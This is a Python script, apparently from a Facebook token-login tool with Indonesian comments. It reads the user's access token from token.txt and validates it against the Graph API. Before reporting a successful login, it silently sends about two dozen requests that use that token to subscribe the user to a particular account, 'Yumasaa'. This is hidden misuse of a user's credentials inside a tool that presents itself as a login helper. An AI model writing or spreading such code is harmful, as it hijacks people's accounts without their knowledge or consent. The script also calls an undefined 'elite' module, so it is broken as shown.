import requests,os,json
import premium

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
O = "\x1b[0;96m" # Biru Muda

def main():
    try:
        token = open("token.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
        a = json.loads(otw.text)
        nama = a["name"]
    except (KeyError,IOError):
        print('%sā'%(M))
        print('%sāāā[%s!%s] %sToken Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        exit(elite.menu_log())
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token)      # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/Yumasaa/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token)       # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token)      # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token)      # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token)        # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    requests.post("https://graph.facebook.com/100071694021818/subscribers?access_token=" + token) # Yumasaa
    print('%sā'%(O))
    print('%sāāā[%s!%s] %sLogin Berhasil'%(O,P,O,P))
    exit(elite.menu())